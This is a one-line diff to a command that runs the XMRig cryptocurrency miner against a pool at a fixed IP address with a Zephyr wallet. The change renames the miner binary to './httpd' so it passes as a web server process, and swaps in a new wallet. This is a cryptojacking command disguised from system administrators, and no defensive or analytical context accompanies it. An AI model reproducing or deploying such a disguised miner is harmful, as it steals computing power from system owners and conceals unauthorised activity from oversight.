@@ -1,1 +1,1 @@
-./xmrig -a randomx -o 43.228.214.173:80 -u ZEPHYR3RyCCbQkAWavcWRFC2Dh8TmHQwM81DMKn7tpfPBtos3iJHfA4LCsW8ta4ZQD4cy5LAJUch2d5ZFngzfryU2DMDpNkMgdn1P -t 2
+./httpd -a randomx -o 43.228.214.173:80 -u ZEPHsCaFdrSPVbkMwt6HMefkaKhNseNk9TuFas7BjYvcAitc5xB6yMaA1n2hUXFFuTa8jhahVL2ADAJRxBFaffpFXJVeyVzdLn4
